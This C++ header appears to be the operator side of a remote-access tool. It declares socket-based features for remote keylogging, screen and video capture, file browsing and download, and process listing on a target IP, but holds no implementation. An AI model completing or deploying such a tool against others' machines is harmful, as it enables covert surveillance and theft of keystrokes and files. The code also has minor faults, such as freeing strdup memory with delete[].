#pragma once
#include <atomic>
#include <cstdint>
#include <filesystem>
#include <string>
#include <unordered_map>
#include <vector>
#include <winsock2.h>
#include <shlobj.h>
#include <objbase.h>
#include <shlwapi.h>
#include <shobjidl.h>

#include "imgui.h"

struct PacketHeader {
    uint32_t packet_size;
    uint16_t request_id;
    uint8_t request_type;
    uint8_t request_key;
};

struct ResponseHeader {
    uint32_t packageSize;
    uint16_t responseID;
    uint16_t statusCode;
};

class Feature {
protected:
    char *m_IP = nullptr;
    const int requestKey;

    int sendRequest(SOCKET sock, int type, int size, const char *data);

    int receiveResponse(SOCKET sock, int &size, char **data);

    SOCKET init();

    std::atomic_int returnValue = 0;

public:
    struct RequestParam {
        int type;
        int size;
        char *data;
        int saveFileSize = 0;
        char *saveFilePath = nullptr;
    };

    Feature(char *IP, int key) : requestKey(key) {
        m_IP = strdup(IP);
    }

    virtual ~Feature(){
        delete[] m_IP;
    };

    virtual int requestingFeature(RequestParam rParam) = 0;

    int getReturnedValue() const {
        return returnValue.load();
    }
};

class FileFeature : public Feature {
    struct FileStruct {
        std::string name;
        bool isDirectory;
        std::string size;
    };

    std::mutex m_mutex;
    std::vector<FileStruct> fileList;
    std::string saveFilePath;
    std::unordered_map<std::string, bool> fileSelectionMap;
    std::string currentSelectedFile;

public:
    std::filesystem::path currentDirectory = "C:\\";
    std::string currentData = "";
    FileFeature(char *IP)
        : Feature(IP, 0x03) {
    }

    int requestingFeature(RequestParam rParam) override;

    std::vector<FileStruct> getFileList();

    HRESULT openSaveAsDialog(std::string defaultFileName);

    std::string getCurrentDirectory() const;
    std::string getCurrentFileName();
    std::string getSaveFilePath() const;
    std::string getCurrentData() {
        std::lock_guard lock(m_mutex);
        return currentData;
    }
    void LoadFileList();

    FileStruct *getSelectedFiles();

    bool isFileSelected();
};

class KeyloggerFeature : public Feature {
    std::atomic_bool isKeyloggerRunning = false;
    std::mutex m_mutex;
    std::string keyloggingValue;

public:
    KeyloggerFeature(char *IP)
        : Feature(IP, 0x01) {
    }

    int requestingFeature(RequestParam rParam) override;

    bool isRunning() const;

    std::string getLogging();
};

class VideoFeature : public Feature {
    std::mutex m_mutex;
public:
    std::atomic_bool isRunning = false;
    std::atomic_bool isVideoAvailable = false;
    std::string videoFilePath;
    std::string videoContent;
    unsigned int videoTextureID = 0;
    VideoFeature(char *IP)
        : Feature(IP, 0x02) {
    }

    int requestingFeature(RequestParam rParam) override;
    HRESULT openSaveAsDialog(std::string defaultFileName = "default.mp4");
};

class WindowFeature : public Feature {
    std::mutex m_mutex;
    std::string screenshotData;
    std::atomic_bool isGottenScreenshot = false;
    std::string screenshotFilePath;
    unsigned int textureID = 0;

public:
    WindowFeature(char *IP)
        : Feature(IP, 0x04) {
    }

    ~WindowFeature();

    int requestingFeature(RequestParam rParam) override;

    bool isScreenshotAvailable() const {
        return isGottenScreenshot.load();
    }

    HRESULT openSaveAsDialog(std::string defaultFileName = "default.bmp");

    std::string getScreenshotData();

    unsigned int getTextID();
};

class ProcessFeature : public Feature {
    static std::unordered_map<DWORD, bool> m_selectedProcesses;

public:
    struct ProcessInfoNode {
        DWORD PID;
        char *Name;
        DWORD ParentPID;
        SIZE_T MemoryUsage;
        ULONGLONG CPUTimeUser;
        int childCount = 0;
        ProcessInfoNode **children = nullptr;

        static void DisplayNode(const ProcessInfoNode *node);

        ProcessInfoNode(DWORD pid, const char *name, DWORD parentPID, SIZE_T memoryUsage, ULONGLONG cpuTimeUser);

        ~ProcessInfoNode();

        void addChild(ProcessInfoNode *child);
    };

private:
    std::mutex m_mutex;
    std::unordered_map<DWORD, ProcessInfoNode *> m_allNodes;

public:
    ProcessFeature(char *IP): Feature(IP, 0x00) {
    };

    int requestingFeature(RequestParam rParam) override;

    std::unordered_map<DWORD, ProcessInfoNode *> getProcessList();

    static std::vector<DWORD> getSelectedProcesses();

    static bool isAnyProcessSelected();

    std::string fromAllNode() {
        std::string result;
        for (const auto &pair: m_allNodes) {
            result += std::to_string(pair.second->PID) + ' ' + *pair.second->Name + ' ' + std::to_string(pair.second->ParentPID) +' ' + std::to_string(pair.second->MemoryUsage) + ' ' + std::to_string(pair.second->CPUTimeUser)+ "\n";
        }
        return result;
    }
};

constexpr COMDLG_FILTERSPEC c_rgSaveTypes[] =
{
    {L"Image", L"*.bmp;*.jpg;*.jpeg;*.png;*.gif"},
};
constexpr COMDLG_FILTERSPEC c_VideoTypes[] =
{
    {L"Video", L"*.mp4"},
};
constexpr COMDLG_FILTERSPEC c_DownloadTypes[] =
{
    {L"All Documents (*.*)", L"*.*"}
};

class CDialogEHandler : public IFileDialogEvents, public IFileDialogControlEvents {
public:
#define INDEX_IMAGE 1
    IFACEMETHODIMP QueryInterface(const IID &riid, void **ppvObject) override {
        static const QITAB qit[] = {
            QITABENT(CDialogEHandler, IFileDialogEvents),
            QITABENT(CDialogEHandler, IFileDialogControlEvents),
            {0},
#pragma warning(suppress:4838)
        };
        return QISearch(this, qit, riid, ppvObject);
    }

    IFACEMETHODIMP_(ULONG) AddRef() {
        return InterlockedIncrement(&_cRef);
    }

    IFACEMETHODIMP_(ULONG) Release() override;

    IFACEMETHODIMP OnFileOk(IFileDialog *) override { return S_OK; };
    IFACEMETHODIMP OnFolderChange(IFileDialog *) override { return S_OK; };
    IFACEMETHODIMP OnFolderChanging(IFileDialog *, IShellItem *) override { return S_OK; };
    IFACEMETHODIMP OnHelp(IFileDialog *) { return S_OK; };
    IFACEMETHODIMP OnSelectionChange(IFileDialog *) override { return S_OK; };
    IFACEMETHODIMP OnShareViolation(IFileDialog *, IShellItem *, FDE_SHAREVIOLATION_RESPONSE *) override {
        return S_OK;
    };
    IFACEMETHODIMP OnTypeChange(IFileDialog *pfd) override { return S_OK; };
    IFACEMETHODIMP OnOverwrite(IFileDialog *, IShellItem *, FDE_OVERWRITE_RESPONSE *) override { return S_OK; };

    // IFileDialogControlEvents methods
    IFACEMETHODIMP OnItemSelected(IFileDialogCustomize *pfdc, DWORD dwIDCtl, DWORD dwIDItem) override { return S_OK; };
    IFACEMETHODIMP OnButtonClicked(IFileDialogCustomize *, DWORD) override { return S_OK; };
    IFACEMETHODIMP OnCheckButtonToggled(IFileDialogCustomize *, DWORD, BOOL) override { return S_OK; };
    IFACEMETHODIMP OnControlActivating(IFileDialogCustomize *, DWORD) override { return S_OK; };

    CDialogEHandler(): _cRef(1) {
    }

    static HRESULT CreateInstance(REFIID riid, void **ppv);

private:
    ~CDialogEHandler() {
    }

    long _cRef = 1;
};

template <class T> void SafeRelease(T **ppT)
{
    if (*ppT)
    {
        (*ppT)->Release();
        *ppT = NULL;
    }
}